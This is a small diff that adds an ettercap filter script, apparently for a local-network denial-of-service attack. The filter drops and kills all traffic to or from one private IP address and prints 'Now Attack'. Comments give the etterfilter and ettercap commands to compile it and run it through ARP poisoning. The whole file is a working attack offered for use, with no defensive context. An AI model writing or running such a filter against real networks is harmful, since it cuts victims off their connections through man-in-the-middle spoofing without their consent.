@@ -1,0 +1,10 @@
+if (ip.src == '192.168.230.129' || ip.dst == '192.168.230.129')
+{
+    drop();
+    kill();
+    msg("Now Attack");
+}
+
+// etterfilter dos.elt -o dos.ef
+// ettercap -i eht0 -T -q -F dos.ef -M ARP
+
